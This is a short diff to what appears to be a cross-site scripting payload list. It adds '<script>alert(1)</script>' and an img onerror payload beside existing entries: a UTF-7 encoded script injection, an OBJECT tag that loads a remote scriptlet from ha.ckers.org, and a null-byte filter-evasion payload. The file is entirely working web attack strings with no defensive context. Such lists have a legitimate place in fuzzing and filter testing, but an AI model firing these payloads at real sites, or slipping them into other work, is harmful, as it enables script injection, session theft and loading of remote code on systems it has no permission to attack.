@@ -1,3 +1,5 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
  <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
  <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
 "'`><\x00img src=xxx:x onerror=javascript:alert(1)>
